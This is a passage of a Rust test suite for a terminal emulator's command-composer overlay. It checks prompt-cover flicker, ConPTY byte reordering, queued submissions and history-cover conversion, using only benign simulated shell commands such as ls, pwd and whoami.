        let _ = st.submit(&b, cover_line_for(&st, &b, true, t), Some("C:\\"));
        for _ in 1..N {
            st.draft = "ls".into();
            st.queue_draft();
        }
        let mut n = 2u32;
        // Protocol sequence number, not a loop counter (clippy 1.97+).
        #[allow(clippy::explicit_counter_loop)]
        for _round in 0..(N * 8) {
            // exec ahead of echo (ConPTY reorder), echo, output scroll.
            b.advance_live(&hook_bytes("exec", r#"{"c":"ls"}"#));
            b.advance_live(b"ls\r\n");
            b.advance_live(b"Documents  Downloads\r\n");
            t += Duration::from_millis(4);
            let _ = prod_frame(&mut st, &mut b, &recs, t);
            // REORDER: the fresh prompt's pre + 133;B arrive BEFORE the prompt
            // text — the cursor sits at col 0, so prompt_end captures
            // provisionally at col 0 (pending upgrade).
            let mut d = hook_bytes("pre", &format!(r#"{{"e":0,"n":{n},"d":"C:"}}"#));
            d.extend_from_slice(b"\x1b]133;B\x07");
            b.advance_live(&d);
            n += 1;
            t += Duration::from_millis(4);
            // THIS frame is the col-0 window: pump must NOT dispatch here.
            let _ = prod_frame(&mut st, &mut b, &recs, t);
            // The prompt text renders (cursor → col 8); the pending upgrade
            // will settle prompt_end there.
            b.advance_live(b"PS C:\\> ");
            t += Duration::from_millis(4);
            let _ = prod_frame(&mut st, &mut b, &recs, t);
            // A few quiet frames let poll_pending_prompt_end settle the cell.
            // The upgrade clock is REAL (last_output_at = Instant::now() in
            // advance_live), so sleep past PROMPT_END_QUIESCE and drive the
            // settle frames on the real clock (the sim-clock caveat).
            std::thread::sleep(Duration::from_millis(45));
            for _ in 0..3 {
                let rt = Instant::now();
                t = t.max(rt);
                let _ = prod_frame(&mut st, &mut b, &recs, rt);
            }
            if !st.buffering() && st.submit_hold.is_none() && st.pending.is_empty() {
                break;
            }
        }
        let covers = b.healthy_covers();
        let cmd_covers: Vec<_> = covers.iter().filter(|c| c.cmd.is_some()).collect();
        let mut lines: Vec<i32> = cmd_covers.iter().map(|c| c.line).collect();
        lines.sort_unstable();
        lines.dedup();
        assert_eq!(
            (cmd_covers.len(), lines.len()),
            (N, N),
            "reorder window must not leak: {N} covers on distinct rows expected, \
             got {} covers / {} distinct rows (raw-prompt flip-flop)",
            cmd_covers.len(),
            lines.len()
        );
        for c in &cmd_covers {
            assert!(
                b.row_has_text_at(c.line, c.col, "ls"),
                "cover at row {} col {} must sit on its `ls` echo",
                c.line,
                c.col
            );
        }
    }

    /// FLICKER REGRESSION — integrated settle window (field: raw prompt +
    /// block cursor visible above the strip while it already shows "Type a
    /// command…"). The permanent editor keeps the strip up through the
    /// ConPTY reorder settle window (pre → provisional col-0 133;B → prompt
    /// text → 40ms quiescence upgrade); the raw prompt row on the grid must
    /// be covered at EVERY frame from the prompt-byte on, or it flashes
    /// beside the editor (the dual-prompt state). Frame-level bound: cover
    /// present the pre frame (N) and every frame after — decoupled from the
    /// column settlement that still gates the SubmitHold.
    #[test]
    fn no_dual_prompt_across_integrated_settle() {
        let recs: Vec<BlockRec> = Vec::new();
        let mut t = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, t), Some(5));
        st.draft = "ls".into();
        let _ = st.submit(&b, cover_line_for(&st, &b, true, t), Some("C:\\"));

        // exec + echo + output scroll (the initial hold converts here).
        b.advance_live(&hook_bytes("exec", r#"{"c":"ls"}"#));
        b.advance_live(b"ls\r\nDocuments  Downloads\r\n");
        t += Duration::from_millis(4);
        let _ = prod_frame(&mut st, &mut b, &recs, t);

        let armed = |st: &ComposerState| st.mode == ComposerMode::Compose;
        // Frame N — the pre (prompt-byte) arrives: incoming-prompt blank.
        b.advance_live(&hook_bytes("pre", r#"{"e":0,"n":2,"d":"C:"}"#));
        t += Duration::from_millis(4);
        let _ = prod_frame(&mut st, &mut b, &recs, t);
        assert!(armed(&st));
        assert!(
            cover_line_for(&st, &b, true, t).is_some(),
            "pre frame N: the incoming prompt row must be blanked"
        );
        // Provisional col-0 133;B (reorder capture, upgrade pending).
        b.advance_live(b"\x1b]133;B\x07");
        t += Duration::from_millis(4);
        let _ = prod_frame(&mut st, &mut b, &recs, t);
        assert!(
            cover_line_for(&st, &b, true, t).is_some(),
            "provisional 133;B frame: still covered"
        );
        // Prompt TEXT renders — cursor → col 8, prompt_end still (5,0)
        // provisional: this is the exact window that used to flash raw.
        b.advance_live(b"PS C:\\> ");
        t += Duration::from_millis(4);
        let _ = prod_frame(&mut st, &mut b, &recs, t);
        assert!(armed(&st));
        assert!(
            !b.cursor_at_prompt_end(),
            "premise: column not settled yet (provisional cell)"
        );
        assert!(
            cover_line_for(&st, &b, true, t).is_some(),
            "provisional-settle window: the raw prompt must never flash beside the editor"
        );
        // Real-clock quiescence settles the column; steady state stays covered.
        std::thread::sleep(Duration::from_millis(45));
        for _ in 0..3 {
            let rt = Instant::now();
            let _ = prod_frame(&mut st, &mut b, &recs, rt);
            assert!(
                cover_line_for(&st, &b, true, rt).is_some(),
                "settled prompt: covered"
            );
        }
    }

    /// FLICKER REGRESSION — nested (heuristic) re-mint window (field:
    /// `root@ubuntu-vm:/home/zany#` + cursor visible while the strip shows
    /// "# Type a command…"). After the first mint the permanent editor keeps
    /// the strip up across an inner command, so the RE-appearing nested
    /// prompt's 300ms arm quiet window used to show raw beside the editor.
    /// The COVER is decoupled from the arm: it lands within ONE at-rest frame
    /// of the classifier first reading the cursor row as a prompt (the
    /// tightest safe bound — a false cover over streaming output is
    /// impossible because feed_gen changes every output batch). Bound met:
    /// classifier-pass frame N → cover present frame N+1; the SUBMISSION arm
    /// still waits the full HEUR_QUIET.
    #[test]
    fn no_dual_prompt_across_heur_remint() {
        let (mut b, mut st, recs, t0) = heur_episode_setup();
        // First mint: Raw(Busy) → Compose (initial entry — no flicker, mode
        // was Raw through its own 300ms window). Sim `now` past the window is
        // fine HERE — we WANT the arm to mint.
        let tm = t0 + HEUR_QUIET + Duration::from_millis(50);
        st.tick(&b, &recs, true, true, tm);
        assert_eq!(st.mode, ComposerMode::Compose);
        assert!(st.heur_live(&b));

        // Submit an inner command (heur ledger lane) and run it.
        let cover = cover_line_for(&st, &b, true, tm);
        let _ = st.dispatch_submission(&b, cover, None, "whoami", tm);
        let _ = st.take_submit_cmd();
        b.advance_live(b"whoami\r\nroot\r\n");
        st.tick(&b, &recs, true, true, tm + Duration::from_millis(10));
        assert!(!st.heur_live(&b), "output tore the arm latch down");
        assert_eq!(st.mode, ComposerMode::Compose, "permanent editor: box stays up");

        // The fresh nested prompt reappears. From here drive on the REAL clock
        // (the arm's HEUR_QUIET reads `last_output_at`, a real stamp): the
        // quiet window must NOT elapse yet — this is the pre-mint window the
        // cover must fill without the arm.
        b.advance_live(b"root@box:/# ");
        // Frame N: the classifier reads the row as a prompt — the optimistic
        // cover paints THIS frame (zero dual-prompt frames), while the arm has
        // NOT minted (quiet < HEUR_QUIET).
        let rn = Instant::now();
        st.tick(&b, &recs, true, true, rn);
        assert_eq!(st.mode, ComposerMode::Compose);
        assert!(!st.heur_live(&b), "arm still waiting (quiet < HEUR_QUIET) at frame N");
        assert_eq!(
            cover_line_for(&st, &b, true, rn),
            Some(b.cursor_line()),
            "frame N: nested cover paints the SAME frame the classifier passes"
        );

        // Frame N+1: still at rest (no output since ⇒ feed_gen unchanged) —
        // the cover HOLDS (not revoked), still before the arm mints.
        let rn2 = Instant::now();
        st.tick(&b, &recs, true, true, rn2);
        assert!(!st.heur_live(&b), "arm still waiting at frame N+1 (cover ≠ arm)");
        assert_eq!(
            cover_line_for(&st, &b, true, rn2),
            Some(b.cursor_line()),
            "an at-rest prompt is not revoked — cover holds"
        );

        // After the full real HEUR_QUIET the arm mints and heur_cover_line
        // takes the row over seamlessly (same row, no flash).
        std::thread::sleep(HEUR_QUIET + Duration::from_millis(30));
        let rn3 = Instant::now();
        st.tick(&b, &recs, true, true, rn3);
        assert!(st.heur_live(&b), "the arm mints after the full HEUR_QUIET");
        assert_eq!(
            cover_line_for(&st, &b, true, rn3),
            Some(b.cursor_line()),
            "seamless hand-off: armed cover on the same row"
        );
    }

    /// Optimistic-with-revocation over STREAMING output: a false cover may
    /// paint for AT MOST ONE frame, then every subsequent streaming frame is
    /// revoked and suppressed — and the ARM never mints/dispatches off it.
    /// The suppress resets on a classifier FAIL, so a genuinely fresh at-rest
    /// prompt after the stream covers again. (Real clock, fast feeds:
    /// HEUR_QUIET never elapses, so the arm stays unminted throughout.)
    #[test]
    fn heur_optimistic_cover_never_covers_streaming() {
        let (mut b, mut st, recs, t0) = heur_episode_setup();
        let tm = t0 + HEUR_QUIET + Duration::from_millis(50);
        st.tick(&b, &recs, true, true, tm);
        assert_eq!(st.mode, ComposerMode::Compose);
        let cover = cover_line_for(&st, &b, true, tm);
        let _ = st.dispatch_submission(&b, cover, None, "make", tm);
        let _ = st.take_submit_cmd();
        b.advance_live(b"make\r\n");

        // Stream output (real clock, fast): each batch ends in `#` with the
        // cursor parked after it — the classifier's worst case. The FIRST
        // frame is optimistically covered; every batch after bumps feed_gen,
        // so frame N+1 REVOKES and the run stays suppressed.
        let mut covered_frames = 0u32;
        for i in 0..6 {
            b.advance_live(b"Building target #");
            let rn = Instant::now();
            st.tick(&b, &recs, true, true, rn);
            assert!(!st.heur_live(&b), "arm must not mint over streaming output");
            if cover_line_for(&st, &b, true, rn).is_some() {
                covered_frames += 1;
                assert_eq!(i, 0, "only the very first streaming frame may be covered");
            }
            b.advance_live(b"\r\n");
        }
        assert_eq!(
            covered_frames, 1,
            "streaming covered for at most one frame, then revoked + suppressed"
        );

        // Suppress resets on a classifier FAIL: after the cursor sits on a
        // non-prompt row, a genuinely fresh at-rest prompt covers again.
        b.advance_live(b"regular output line\r\n"); // cursor col 0 ⇒ fails
        let rf = Instant::now();
        st.tick(&b, &recs, true, true, rf);
        assert_eq!(
            cover_line_for(&st, &b, true, rf),
            None,
            "a non-prompt row is never covered"
        );
        b.advance_live(b"root@box:/# "); // the real fresh prompt
        let rn = Instant::now();
        st.tick(&b, &recs, true, true, rn);
        assert_eq!(
            cover_line_for(&st, &b, true, rn),
            Some(b.cursor_line()),
            "a fresh at-rest prompt after streaming covers again (suppress reset on fail)"
        );
    }

    /// FRAME-TRACE — one full integrated submit cycle has NO single-frame
    /// raw hole: the just-submitted command's row stays covered (SubmitHold
    /// ghost → history cover, handed off in one frame) at EVERY frame, and
    /// the fresh prompt's row is covered from its pre onward. This is the
    /// hold→history→new-prompt handoff the user might otherwise see flash.
    #[test]
    fn integrated_submit_cycle_no_cover_hole() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = backend_full_screen_prompt(); // prompt on row 5 (bottom)
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, now), Some(5));

        st.draft = "ls".into();
        let _ = st.submit(&b, cover_line_for(&st, &b, true, now), Some("C:\\"));

        // A grid row is "covered" (blanked, not raw) if the current-prompt
        // cover is on it OR a healthy presentational cover sits on it.
        let covered = |b: &TermBackend, cl: Option<i32>, line: i32| -> bool {
            cl == Some(line) || b.healthy_covers().iter().any(|c| c.line == line)
        };

        // Deliver the cycle chunk-by-chunk (ConPTY order: exec ahead of echo).
        let mut prompt = hook_bytes("pre", r#"{"e":0,"n":2,"d":"C:"}"#);
        prompt.extend_from_slice(b"PS C:\\> ");
        let chunks: Vec<Vec<u8>> = vec![
            hook_bytes("exec", r#"{"c":"ls"}"#), // exec OSC (grid untouched)
            b"ls".to_vec(),                      // echo lands → hold converts
            b"\r\nout1\r\n".to_vec(),            // output scrolls the ls row up
            prompt,                              // fresh pre + prompt text
            b"\x1b]133;B\x07".to_vec(),          // fresh prompt settles
        ];
        for (i, ch) in chunks.iter().enumerate() {
            b.advance_live(ch);
            let cl = sim_frame(&mut st, &mut b, &recs, now);
            assert_eq!(st.mode, ComposerMode::Compose, "chunk {i}: box stays up");
            // The submit row's live position: the hold pin while live, else
            // the `ls` history cover it converted to.
            let submit_row = st.hold_line(&b, now).or_else(|| {
                b.healthy_covers()
                    .iter()
                    .find(|c| c.cmd.as_deref() == Some("ls"))
                    .map(|c| c.line)
            });
            if let Some(r) = submit_row {
                assert!(
                    covered(&b, cl, r),
                    "chunk {i}: submit row {r} must stay covered — no raw hole"
                );
            }
        }
        // End state: the ls converted to a history cover, and the fresh
        // prompt row is the live cover (no hole through the whole handoff).
        assert!(
            b.healthy_covers()
                .iter()
                .any(|c| c.cmd.as_deref() == Some("ls")),
            "ls became a history cover"
        );
        assert_eq!(
            cover_line_for(&st, &b, true, now),
            Some(5),
            "fresh prompt row is covered"
        );
    }

    /// The flush preserves byte order relative to queued Enters: queued
    /// commands each carry their `\r`, interleaved spacers keep theirs, the
    /// live draft comes last WITHOUT a trailing `\r` (never pressed).
    #[test]
    fn flush_preserves_byte_order_across_queued_enters() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, now), Some(5));

        st.draft = "vim x".into();
        let _ = st.submit(&b, Some(5), Some("C:\\"));
        st.draft = "hi".into();
        st.queue_draft(); // hi⏎
        st.push_spacer(); // ⏎
        st.draft = "tail".into(); // trailing keys, no Enter yet

        b.advance_live(b"\x1b[?1049h"); // the app takes the screen
        st.tick(&b, &recs, true, false, now + Duration::from_millis(30));
        assert_eq!(
            st.take_pending_clear().as_deref(),
            Some(b"hi\r\rtail".as_ref()),
            "byte order: cmd + its Enter, the spacer Enter, then the draft"
        );
        assert_eq!(st.mode, ComposerMode::Raw(RawReason::AltScreen));
    }

    /// Demotion mid-buffer (certainty lost with submissions still queued):
    /// the queue flushes raw — honest shell type-ahead, in order — while the
    /// visible draft is kept exactly like every other demotion.
    #[test]
    fn demotion_mid_buffer_flushes_pending_raw() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, now), Some(5));

        st.draft = "slow".into();
        let _ = st.submit(&b, Some(5), Some("C:\\"));
        st.draft = "next".into();
        st.queue_draft();
        st.draft = "keep me".into();

        // The shell answers with a pre but NEVER a 133;B (wedged prompt
        // render): the window closes on the fresh pre, the pump can never
        // certify a clean prompt, and the demotion clock runs.
        let mut d = hook_bytes("exec", r#"{"c":"slow"}"#);
        d.extend_from_slice(b"slow\r\n");
        d.extend(hook_bytes("pre", r#"{"e":0,"n":9,"d":"C:"}"#));
        d.extend_from_slice(b"PS C:\\> ");
        b.advance_live(&d);
        let t1 = now + Duration::from_millis(100);
        let _ = sim_frame(&mut st, &mut b, &recs, t1);
        assert_eq!(st.mode, ComposerMode::Compose, "clock started, not demoted yet");
        assert!(st.take_pending_clear().is_none());

        let t2 = t1 + DEMOTE;
        st.tick(&b, &recs, true, false, t2);
        assert_eq!(st.mode, ComposerMode::Raw(RawReason::NoPrompt));
        assert_eq!(
            st.take_pending_clear().as_deref(),
            Some(b"next\r".as_ref()),
            "queued submissions flush raw on demotion"
        );
        assert_eq!(st.draft, "keep me", "the visible draft is kept");
        assert!(st.pending.is_empty());
    }

    /// A window whose resolution tick arrives WINDOW_STALE late (deselected
    /// terminal / occluded GUI — tick paused) folds the buffer into the
    /// draft instead of firing bytes into a moment that has passed.
    #[test]
    fn stale_window_folds_buffer_into_draft() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, now), Some(5));

        st.draft = "a".into();
        let _ = st.submit(&b, Some(5), Some("C:\\"));
        st.draft = "b".into();
        st.queue_draft();
        st.draft = "c-partial".into();

        st.tick(&b, &recs, true, false, now + WINDOW_STALE + Duration::from_millis(1));
        assert!(st.take_pending_clear().is_none(), "nothing may fire late");
        assert_eq!(
            st.draft, "b\nc-partial",
            "the buffer is folded into the visible draft for re-confirmation"
        );
        assert!(!st.buffering());
    }

    /// A resize mid-hold drops the pin (release, never convert at reflowed
    /// coordinates) — raw is honest, drift never is.
    #[test]
    fn hold_drops_on_resize() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, now), Some(5));
        st.draft = "ls".into();
        let _ = st.submit(&b, Some(5), Some("C:\\"));
        assert_eq!(st.hold_line(&b, now), Some(5));
        b.resize_to(egui::vec2(30.0 * 8.0, 6.0 * 16.0), egui::vec2(8.0, 16.0));
        assert_eq!(st.hold_line(&b, now), None, "resize invalidates the pin");
        st.tick(&b, &recs, true, false, now);
        assert!(st.submit_hold.is_none(), "released");
        assert_eq!(st.take_pending_history_cover(), None, "never converted");
    }

    /// Bug 1a (render-bugs pass, "history rows inconsistently styled"): an
    /// Enter landing inside the pre→133;B prompt-RENDER window used to
    /// dispatch immediately — `can_submit` passes because the pre latched
    /// at_prompt — but with prompt_end invalidated there was no cover_line,
    /// so NO SubmitHold got pinned and that submission was permanently
    /// ineligible for the `❯` history-cover conversion: its row showed raw
    /// `PS …> cmd` forever, right next to converted neighbours. The fix
    /// queues the window submit; pump_pending dispatches it the frame 133;B
    /// lands, with full cover certainty.
    #[test]
    fn window_submit_queues_then_converts_via_pump() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, now), Some(5));

        // cmd1 submitted armed-clean.
        st.draft = "pwd".into();
        let cl = cover_line_for(&st, &b, true, now);
        let (bytes, _) = st.submit(&b, cl, Some("C:\\"));
        assert_eq!(bytes, b"pwd\r");

        // One burst: exec + echo + output + the fresh pre. The prompt text
        // has NOT rendered yet — the render window is open.
        let mut d = hook_bytes("exec", r#"{"c":"pwd"}"#);
        d.extend_from_slice(b"pwd\r\nout\r\n");
        d.extend(hook_bytes("pre", r#"{"e":0,"n":2,"d":"C:"}"#));
        b.advance_live(&d);
        let _ = sim_frame(&mut st, &mut b, &recs, now);
        assert_eq!(b.healthy_covers().len(), 1, "cmd1 converted on release");
        assert_eq!(st.mode, ComposerMode::Compose);

        // THE BUG SHAPE: Enter for cmd2 lands NOW, inside the window.
        st.draft = "ls".into();
        let cl = cover_line_for(&st, &b, true, now);
        let (bytes, spacer) = st.submit(&b, cl, Some("C:\\"));
        assert!(bytes.is_empty(), "a window submit must not dispatch uncovered");
        assert!(!spacer);
        assert!(st.buffering(), "queued for the prompt cycle");
        assert!(st.submit_hold.is_none(), "no hold may pin without certainty");
        assert_eq!(st.mode, ComposerMode::Compose);

        // Prompt text + 133;B: the pump dispatches cmd2 with full certainty
        // (this is the show() pump call, one frame later).
        let mut d = b"PS C:\\> ".to_vec();
        d.extend_from_slice(b"\x1b]133;B\x07");
        b.advance_live(&d);
        let _ = sim_frame(&mut st, &mut b, &recs, now);
        let cl = cover_line_for(&st, &b, true, now);
        let (bytes, spacer) = st
            .pump_pending(&b, cl, Some("C:\\"), now)
            .expect("pump dispatches at the fresh clean prompt");
        assert_eq!(bytes, b"ls\r");
        assert!(!spacer);
        assert!(st.submit_hold.is_some(), "hold pinned on the fresh prompt row");

        // cmd2 echoes: release converts — BOTH rows styled, zero raw rows.
        let mut d = hook_bytes("exec", r#"{"c":"ls"}"#);
        d.extend_from_slice(b"ls\r\nout2\r\n");
        b.advance_live(&d);
        let _ = sim_frame(&mut st, &mut b, &recs, now);
        let covers = b.healthy_covers();
        assert_eq!(covers.len(), 2, "both submits converted to history covers");
        assert!(covers.iter().any(|c| c.cmd.as_deref() == Some("pwd")));
        assert!(covers.iter().any(|c| c.cmd.as_deref() == Some("ls")));
    }

    /// Bug 1b: a machine hitch delaying the shell echo past the old 250ms
    /// soft cap used to release the hold UNCONVERTED — and since release is
    /// the only conversion point, the row stayed raw `PS …> cmd` forever
    /// once the late echo landed. The hold now lives until echo_landed (or
    /// the SUBMIT_HOLD_MAX hard bound for input the shell truly ate).
    #[test]
    fn hitch_delayed_echo_still_converts() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, now), Some(5));
        st.draft = "ls".into();
        let cl = cover_line_for(&st, &b, true, now);
        let _ = st.submit(&b, cl, Some("C:\\"));

        // 400ms pass with NO bytes (the hitch): past the old soft cap. The
        // hold must survive and keep covering the still-bare prompt row.
        // (h.since is stamped inside submit(), so probe from fresh Instants.)
        let late = Instant::now() + Duration::from_millis(400);
        st.tick(&b, &recs, true, true, late);
        assert!(st.submit_hold.is_some(), "hold survives the hitch");
        assert_eq!(st.hold_line(&b, late), Some(5), "ghost keeps covering");

        // The late echo lands: release + convert (the old cap lost this
        // conversion forever).
        b.advance_live(b"ls");
        let late2 = late + Duration::from_millis(16);
        st.tick(&b, &recs, true, true, late2);
        assert!(st.submit_hold.is_none(), "echo landed ⇒ released");
        assert_eq!(
            st.take_pending_history_cover()
                .map(|(l, c, _, cmd)| (l, c, cmd)),
            Some((5, 8, "ls".to_string())),
            "late echo still converts to a history cover"
        );
    }

    /// Field-journal replay (Bug 1, env-gated): `TC_BUG1_JOURNAL=<path>` to
    /// a REAL hooked-PowerShell journal (.log). Replays the raw byte stream
    /// through the exact mod.rs frame order in ~275-byte chunks (conhost's
    /// real write granularity), submits every command through the composer
    /// at the WORST moment — inside the pre→133;B prompt-render window,
    /// except the first — and asserts every single submission converts to a
    /// `❯` history cover on a row that really shows its echo. This is the
    /// user bar: N mixed-speed submits ⇒ N covers, zero raw `PS …>` rows.
    #[test]
    fn field_journal_all_submits_convert() {
        let Ok(path) = std::env::var("TC_BUG1_JOURNAL") else {
            return;
        };
        let bytes = std::fs::read(&path).expect("journal readable");
        let find_all = |needle: &[u8]| -> Vec<usize> {
            let mut out = Vec::new();
            let mut at = 0;
            while at + needle.len() <= bytes.len() {
                match bytes[at..].windows(needle.len()).position(|w| w == needle) {
                    Some(p) => {
                        out.push(at + p);
                        at += p + needle.len();
                    }
                    None => break,
                }
            }
            out
        };
        let osc_end = |start: usize| -> usize {
            bytes[start..]
                .iter()
                .position(|&b| b == 0x07)
                .map(|p| start + p + 1)
                .expect("hook OSC terminated")
        };
        // Prompt cycle markers: pre-hook OSC ends and 133;B ends, paired in
        // stream order.
        let pres: Vec<usize> = find_all(b";pre;").iter().map(|&p| osc_end(p)).collect();
        let bends: Vec<usize> = find_all(b"\x1b]133;B\x07")
            .iter()
            .map(|&p| p + 8)
            .collect();
        // Commands from the exec payloads (hex JSON {"c":"<cmd>"}).
        let cmds: Vec<String> = find_all(b";exec;")
            .iter()
            .map(|&p| {
                let hex: Vec<u8> = bytes[p + 6..osc_end(p + 6) - 1].to_vec();
                let json: Vec<u8> = hex
                    .chunks(2)
                    .map(|c| u8::from_str_radix(std::str::from_utf8(c).unwrap(), 16).unwrap())
                    .collect();
                let s = String::from_utf8(json).unwrap();
                let c = s.split("\"c\":\"").nth(1).expect("exec has c");
                c.split('"').next().unwrap().to_string()
            })
            .collect();
        let n = cmds.len();
        assert!(n >= 2, "journal must carry at least two commands");
        assert!(pres.len() > n && bends.len() > n, "hook pairs present");

        let mut b = TermBackend::new(GridSize {
            cols: 160,
            rows: 42,
            cell_width: 8.0,
            cell_height: 16.0,
        });
        b.set_stream_pos(0);
        b.enable_block_scan();
        let recs: Vec<BlockRec> = Vec::new();
        let mut st = ComposerState::default();
        let now = Instant::now();
        let mut fed = 0usize;
        let mut feed_to = |b: &mut TermBackend, st: &mut ComposerState, to: usize| {
            while fed < to {
                let next = (fed + 275).min(to);
                b.advance_live(&bytes[fed..next]);
                fed = next;
                let _ = sim_frame(st, b, &recs, now);
            }
        };

        // Boot to the first armed prompt.
        feed_to(&mut b, &mut st, bends[0]);
        assert_eq!(st.mode, ComposerMode::Compose, "first prompt arms");

        for (i, cmd) in cmds.iter().enumerate() {
            if i == 0 {
                // First command: armed-clean submit (the easy path).
                st.draft = cmd.clone();
                let cl = cover_line_for(&st, &b, true, now);
                let (w, _) = st.submit(&b, cl, Some("C:\\Terminal Control"));
                assert!(!w.is_empty(), "armed submit dispatches");
            } else {
                // Window submit queued at the previous iteration; dispatch it
                // now that this command's prompt is latched clean (the show()
                // pump, one frame after 133;B).
                let cl = cover_line_for(&st, &b, true, now);
                let (w, _) = st
                    .pump_pending(&b, cl, Some("C:\\Terminal Control"), now)
                    .unwrap_or_else(|| panic!("pump dispatches cmd {i} ({cmd})"));
                assert!(!w.is_empty());
            }
            // Feed this command's echo + output + the NEXT prompt's pre.
            feed_to(&mut b, &mut st, pres[i + 1]);
            // The hold must have released AND converted by now.
            assert!(st.submit_hold.is_none(), "cmd {i} ({cmd}) hold released");
            if i + 1 < n {
                // WORST-CASE Enter: the next command submitted INSIDE the
                // render window (this is what left rows raw pre-fix).
                st.draft = cmds[i + 1].clone();
                let cl = cover_line_for(&st, &b, true, now);
                let (w, _) = st.submit(&b, cl, Some("C:\\Terminal Control"));
                assert!(w.is_empty(), "window submit queues (cmd {})", i + 1);
                assert!(st.buffering());
            }
            // Feed the prompt text + 133;B closing this cycle.
            feed_to(&mut b, &mut st, bends[i + 1]);
        }

        // THE BAR: every submission is a healthy `❯` history cover on a row
        // really showing its echo — zero raw `PS …>` command rows.
        let covers = b.healthy_covers();
        let got: Vec<&str> = covers
            .iter()
            .filter_map(|c| c.cmd.as_deref())
            .collect();
        assert_eq!(
            got.len(),
            n,
            "every submit converts: expected {n} history covers, got {got:?}"
        );
        for (i, cmd) in cmds.iter().enumerate() {
            assert!(
                got.iter().filter(|g| **g == cmd.as_str()).count()
                    >= cmds.iter().filter(|c| *c == cmd).count().min(1),
                "cmd {i} ({cmd}) has a cover"
            );
        }
        for c in &covers {
            if let Some(cmd) = &c.cmd {
                assert!(
                    b.row_has_text_at(c.line, c.col, cmd.lines().next().unwrap()),
                    "cover row {} really shows `{cmd}`",
                    c.line
                );
            }
        }
    }
}
